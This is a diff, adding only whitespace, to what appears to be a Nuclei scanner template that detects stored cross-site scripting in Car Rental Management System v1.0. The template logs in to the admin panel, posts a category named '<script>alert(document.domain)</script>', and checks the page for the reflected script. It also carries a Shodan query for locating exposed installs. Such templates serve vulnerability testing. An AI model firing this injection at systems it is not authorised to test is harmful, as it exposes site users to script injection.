@@ -1,4 +1,5 @@
 id: carrental-xss
+
 info:
   name: Car Rental Management System v1.0 - Stored Cross Site Scripting
   author: arafatansari
@@ -12,6 +13,7 @@ info:
     verified: true
     shodan-query: http.html:"Car Rental Management System"
   tags: xss,cms,authenticated
+
 requests:
   - raw:
       - |
@@ -20,6 +22,7 @@ requests:
         Content-Type: application/x-www-form-urlencoded
 
         username={{username}}&password={{password}}
+
       - |
         POST /admin/ajax.php?action=save_category HTTP/1.1
         Host: {{Hostname}}
@@ -38,9 +41,11 @@ requests:
 
         <script>alert(document.domain)</script>
         ------WebKitFormBoundaryCMJ5bh3B6m9767Em--
+
       - |
         GET /admin/index.php?page=categories HTTP/1.1
         Host: {{Hostname}}
+
     redirects: true
     max-redirects: 2
     cookie-reuse: true
@@ -50,10 +55,12 @@ requests:
         part: body
         words:
           - '<p>Name: <b></script><script>alert(document.domain)</script></b>'
+
       - type: word
         part: header
         words:
           - text/html
+
       - type: status
         status:
           - 200
